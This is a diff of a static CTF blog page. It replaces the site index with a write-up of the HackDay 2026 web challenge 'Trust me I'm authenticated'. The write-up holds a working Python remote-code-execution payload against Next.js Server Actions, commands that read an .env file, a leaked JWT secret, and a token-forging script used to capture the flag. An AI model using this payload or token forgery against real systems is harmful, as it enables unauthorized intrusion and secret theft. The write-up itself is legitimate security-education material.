@@ -12,29 +12,27 @@
         <meta name="author" content="GougasseHamza">
       
       
-        <link rel="canonical" href="https://GougasseHamza.github.io/wp/">
+        <link rel="canonical" href="https://GougasseHamza.github.io/wp/hackday2026/">
       
       
-      
-        <link rel="next" href="asis-ctf/">
       
       
         
       
       
-      <link rel="icon" href="assets/images/favicon.png">
+      <link rel="icon" href="../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
       
-        <title>CTF Writeups</title>
+        <title>Trust me I'm authenticated — HackDay 2026 - CTF Writeups</title>
       
     
     
-      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -53,9 +51,9 @@
       
     
     
-      <link rel="stylesheet" href="stylesheets/extra.css">
+      <link rel="stylesheet" href="../stylesheets/extra.css">
     
-    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
   
@@ -82,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#ctf-writeups" class="md-skip">
+        <a href="#trust-me-im-authenticated-hackday-2026" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +96,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="." title="CTF Writeups" class="md-header__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
+    <a href=".." title="CTF Writeups" class="md-header__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -118,7 +116,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Home
+              Trust me I'm authenticated — HackDay 2026
             
           </span>
         </div>
@@ -228,11 +226,9 @@
   
   
   
-    
   
-  
-    <li class="md-tabs__item md-tabs__item--active">
-      <a href="." class="md-tabs__link">
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
         
   
   
@@ -253,7 +249,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="asis-ctf/" class="md-tabs__link">
+        <a href="../asis-ctf/" class="md-tabs__link">
           
   
   
@@ -271,7 +267,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="about/" class="md-tabs__link">
+      <a href="../about/" class="md-tabs__link">
         
   
   
@@ -312,7 +308,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="." title="CTF Writeups" class="md-nav__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
+    <a href=".." title="CTF Writeups" class="md-nav__button md-logo" aria-label="CTF Writeups" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -339,37 +335,10 @@
       
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Home
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="." class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
         
   
   
@@ -385,76 +354,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#recent-challenges" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Recent Challenges
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Recent Challenges">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#asis-ctf" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        ASIS CTF
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#hackday-2026" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        HackDay 2026
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#uoftctf" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        UofTCTF
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -520,7 +419,7 @@
   
   
     <li class="md-nav__item">
-      <a href="asis-ctf/" class="md-nav__link">
+      <a href="../asis-ctf/" class="md-nav__link">
         
   
   
@@ -548,7 +447,7 @@
   
   
     <li class="md-nav__item">
-      <a href="asis-ctf/sanchess/" class="md-nav__link">
+      <a href="../asis-ctf/sanchess/" class="md-nav__link">
         
   
   
@@ -576,7 +475,7 @@
   
   
     <li class="md-nav__item">
-      <a href="asis-ctf/rick-gallery/" class="md-nav__link">
+      <a href="../asis-ctf/rick-gallery/" class="md-nav__link">
         
   
   
@@ -604,7 +503,7 @@
   
   
     <li class="md-nav__item">
-      <a href="asis-ctf/asis-mail/" class="md-nav__link">
+      <a href="../asis-ctf/asis-mail/" class="md-nav__link">
         
   
   
@@ -632,7 +531,7 @@
   
   
     <li class="md-nav__item">
-      <a href="asis-ctf/bookmarks/" class="md-nav__link">
+      <a href="../asis-ctf/bookmarks/" class="md-nav__link">
         
   
   
@@ -667,7 +566,7 @@
   
   
     <li class="md-nav__item">
-      <a href="about/" class="md-nav__link">
+      <a href="../about/" class="md-nav__link">
         
   
   
@@ -714,52 +613,79 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#recent-challenges" class="md-nav__link">
+  <a href="#background" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Recent Challenges
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Recent Challenges">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#asis-ctf" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        ASIS CTF
+        Background
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#hackday-2026" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#recon-and-early-dead-ends" class="md-nav__link">
     <span class="md-ellipsis">
       
-        HackDay 2026
+        Recon and early dead ends
       
     </span>
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#uoftctf" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#cve-2024-34351-rce" class="md-nav__link">
     <span class="md-ellipsis">
       
-        UofTCTF
+        CVE-2024-34351 RCE
       
     </span>
   </a>
   
 </li>
-        
-      </ul>
-    </nav>
+      
+        <li class="md-nav__item">
+  <a href="#taming-output-noise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Taming output noise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding secrets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#forging-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Forging authentication
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
   
 </li>
       
@@ -780,7 +706,7 @@
 
 
   
-    <a href="https://github.com/GougasseHamza/wp/edit/main/docs/index.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+    <a href="https://github.com/GougasseHamza/wp/edit/main/docs/hackday2026/index.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75z"/></svg>
     </a>
@@ -789,62 +715,109 @@
     
       
     
-    <a href="https://github.com/GougasseHamza/wp/raw/main/docs/index.md" title="View source of this page" class="md-content__button md-icon">
+    <a href="https://github.com/GougasseHamza/wp/raw/main/docs/hackday2026/index.md" title="View source of this page" class="md-content__button md-icon">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5"/></svg>
     </a>
   
 
 
-<h1 id="ctf-writeups">CTF Writeups<a class="headerlink" href="#ctf-writeups" title="Permanent link">&para;</a></h1>
-<p>Personal blog to keep track of the past CTF challs  ( web + some crypto / OSINT) and to share with everyone.</p>
-<h2 id="recent-challenges">Recent Challenges<a class="headerlink" href="#recent-challenges" title="Permanent link">&para;</a></h2>
-<h3 id="asis-ctf">ASIS CTF<a class="headerlink" href="#asis-ctf" title="Permanent link">&para;</a></h3>
-<p>I recently tackled four web exploitation challenges from ASIS CTF. Each one taught me something new about breaking (and hopefully, securing) web applications.</p>
-<div class="grid cards">
+<h1 id="trust-me-im-authenticated-hackday-2026">Trust me I'm authenticated — HackDay 2026<a class="headerlink" href="#trust-me-im-authenticated-hackday-2026" title="Permanent link">&para;</a></h1>
+<h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Target: <code>https://fhjhtr10n9.hackday.fr</code></li>
+<li><code>/flag</code> gated by HTTP 401, <code>/terminal</code> hosted a Next.js “legacy terminal” and nginx/proxying a Go API that returned 404 on port 80.</li>
+<li>Source comment “Last update: 2002” hinted at older auth mechanisms.</li>
+</ul>
+<h2 id="recon-and-early-dead-ends">Recon and early dead ends<a class="headerlink" href="#recon-and-early-dead-ends" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>/flag</code> reliably 401’ed even after trying header-based bypasses (<code>X-Forwarded-For</code>, <code>X-Real-IP</code>, <code>X-Client-IP</code>, <code>X-Original-URL</code>) and brute-forcing Basic Auth with <code>admin:2002</code>.</li>
+<li><code>/terminal</code> rendered a fake shell; inspecting the bundle reminded me of CVE-2024-34351 (Next.js Server Actions SSRF). A publicly available scanner flagged the app as vulnerable, but the “safe-check” SSRF payload never reached my redirect server and kept throwing 500s.</li>
+</ul>
+<h2 id="cve-2024-34351-rce">CVE-2024-34351 RCE<a class="headerlink" href="#cve-2024-34351-rce" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
-<p><strong>Sanchess</strong></p>
-<hr />
-<p><a href="asis-ctf/sanchess/">Writeup</a></p>
+<p>Re-running the scanner without the safe-check triggered the RCE test payload. The server responded <code>303</code> with <code>X-Action-Redirect: /login?a=11111;push</code>, proving arbitrary server-side code execution through the Next.js Server Action.</p>
 </li>
 <li>
-<p><strong>Rick Gallery</strong></p>
-<hr />
-<p><a href="asis-ctf/rick-gallery/">Writeup</a></p>
-</li>
-<li>
-<p><strong>ASIS Mail</strong></p>
-<hr />
-<p><a href="asis-ctf/asis-mail/">Writeup</a></p>
-</li>
-<li>
-<p><strong>Bookmarks</strong></p>
-<hr />
-<p><a href="asis-ctf/bookmarks/">Writeup</a></p>
+<p>Crafted a custom Python exploit that mimicked the scanner’s payload structure by abusing the promise hooks in the form submission. The key part was building <code>process.mainModule.require('child_process').execSync</code> and surfacing the result through a <code>NEXT_REDIRECT</code> error to force it into the <code>X-Action-Redirect</code> header.</p>
 </li>
 </ul>
-</div>
-<h3 id="hackday-2026">HackDay 2026<a class="headerlink" href="#hackday-2026" title="Permanent link">&para;</a></h3>
-<div class="grid cards">
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib3</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&quot;echo $((41*271))&quot;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://fhjhtr10n9.hackday.fr/terminal&quot;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">boundary</span> <span class="o">=</span> <span class="s2">&quot;----WebKitFormBoundaryx8jO2oVc6SWP3Sad&quot;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">prefix_payload</span> <span class="o">=</span> <span class="p">(</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="sa">f</span><span class="s2">&quot;var res=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&#39;)&quot;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="sa">f</span><span class="s2">&quot;.toString().trim();;throw Object.assign(new Error(&#39;NEXT_REDIRECT&#39;),&quot;</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    <span class="sa">f</span><span class="s2">&quot;</span><span class="se">{{</span><span class="s2">digest: `NEXT_REDIRECT;push;/login?a=$</span><span class="se">{{</span><span class="s2">res</span><span class="se">}}</span><span class="s2">;307;`</span><span class="se">}}</span><span class="s2">);&quot;</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">)</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="n">part0</span> <span class="o">=</span> <span class="p">(</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="s1">&#39;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&#39;</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="s1">&#39;&quot;value&quot;:&quot;{</span><span class="se">\\</span><span class="s1">&quot;then</span><span class="se">\\</span><span class="s1">&quot;:</span><span class="se">\\</span><span class="s1">&quot;$B1337</span><span class="se">\\</span><span class="s1">&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;&#39;</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>    <span class="o">+</span> <span class="n">prefix_payload</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>    <span class="o">+</span> <span class="s1">&#39;&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}&#39;</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">)</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>    <span class="sa">f</span><span class="s2">&quot;------</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>    <span class="sa">f</span><span class="s1">&#39;Content-Disposition: form-data; name=&quot;0&quot;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>    <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">part0</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>    <span class="sa">f</span><span class="s2">&quot;------</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>    <span class="sa">f</span><span class="s1">&#39;Content-Disposition: form-data; name=&quot;1&quot;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>    <span class="sa">f</span><span class="s1">&#39;&quot;$@0&quot;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>    <span class="sa">f</span><span class="s2">&quot;------</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>    <span class="sa">f</span><span class="s1">&#39;Content-Disposition: form-data; name=&quot;2&quot;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>    <span class="sa">f</span><span class="s2">&quot;[]</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>    <span class="sa">f</span><span class="s2">&quot;------</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">--&quot;</span>
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="p">)</span>
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Next-Action&quot;</span><span class="p">:</span> <span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;X-Action-Redirect&quot;</span><span class="p">))</span>
+</span></code></pre></div>
 <ul>
-<li>
-<p><strong>Trust me I'm authenticated</strong></p>
-<hr />
-<p><a href="hackday2026/">Writeup</a></p>
-</li>
+<li>Running the script with simple commands confirmed RCE as the <code>app</code> user inside <code>/app</code>:</li>
+<li><code>python test_rce.py "whoami"</code> → <code>X-Action-Redirect: /login?a=app;push</code></li>
+<li><code>python test_rce.py "pwd"</code> → <code>/login?a=/app;push</code></li>
+<li><code>python test_rce.py "id"</code> → <code>/login?a=uid=100(app) gid=101(app) groups=101(app);push</code></li>
 </ul>
-</div>
-<h3 id="uoftctf">UofTCTF<a class="headerlink" href="#uoftctf" title="Permanent link">&para;</a></h3>
-<div class="grid cards">
+<h2 id="taming-output-noise">Taming output noise<a class="headerlink" href="#taming-output-noise" title="Permanent link">&para;</a></h2>
 <ul>
-<li>
-<p><strong>Misc</strong></p>
-<hr />
-<p><a href="uofctf/misc/">Writeup</a></p>
-</li>
+<li>Multi-line output (e.g., <code>ls -la</code>) caused the redirect header to break and return 500/502. Wrapping commands in <code>echo $(...)</code> collapsed whitespace and made the header friendly again:</li>
+<li><code>python test_rce.py 'echo $(ls)'</code> → redirected with the root <code>/app</code> listing.</li>
+<li><code>python test_rce.py 'echo $(ls /)'</code> → returned the top-level directories.</li>
 </ul>
-</div>
+<h2 id="finding-secrets">Finding secrets<a class="headerlink" href="#finding-secrets" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Enumerating <code>/app</code> using the echo trick revealed <code>.env.development</code>. Reading it via <code>echo $(cat .env.development)</code> exposed:</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>JWT_SECRET_KEY=eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc=
+</span></code></pre></div>
+<h2 id="forging-authentication">Forging authentication<a class="headerlink" href="#forging-authentication" title="Permanent link">&para;</a></h2>
+<ul>
+<li>The challenge name (“Trust me I’m authenticated”) and the secret implied JWT-based gating. Using <code>pyjwt</code> with the leaked key, I minted tokens with different payloads. The server only verified the signature, so even <code>{}</code> worked:</li>
+</ul>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib3</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">secret</span> <span class="o">=</span> <span class="s2">&quot;eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc=&quot;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;https://fhjhtr10n9.hackday.fr/flag&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">},</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">1</span><span class="p">])</span>
+</span></code></pre></div>
+<ul>
+<li>Requesting <code>/flag</code> with the forged bearer token returned the flag page in plain HTML.</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>HACKDAY{220d51b50ba176090af032df28c309547db1f2a445eb2a0740746b61356e683f}</code></li>
+</ul>
 
 
 
@@ -928,28 +901,6 @@
         <footer class="md-footer">
   
     
-      
-      <nav class="md-footer__inner md-grid" aria-label="Footer" >
-        
-        
-          
-          <a href="asis-ctf/" class="md-footer__link md-footer__link--next" aria-label="Next: Overview">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                Overview
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
-    
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
@@ -996,10 +947,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.action.edit", "content.action.view"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
